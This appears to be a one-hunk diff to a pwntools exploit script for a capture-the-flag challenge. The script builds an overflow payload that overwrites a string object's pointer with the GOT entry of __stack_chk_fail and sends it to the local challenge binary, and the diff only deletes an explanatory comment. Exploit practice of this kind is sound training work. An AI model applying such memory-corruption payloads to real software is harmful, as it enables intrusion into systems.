@@ -689,7 +689,7 @@ b*main+510
 """
 s = process(executable = "./chall", argv = [])
 #s = remote("string-chan-b4fc1611fb16fcab.chall.ctf.blackpinker.com", 443, ssl = True)
-payload = b'A' * 0x20 + p64(e.got['__stack_chk_fail']) + p64(8) * 2 #pointer, size, allocate capacity respectively
+payload = b'A' * 0x20 + p64(e.got['__stack_chk_fail']) + p64(8) * 2 
 s.sendlineafter(b'choice: ',b'1')
 s.sendline(payload)
 
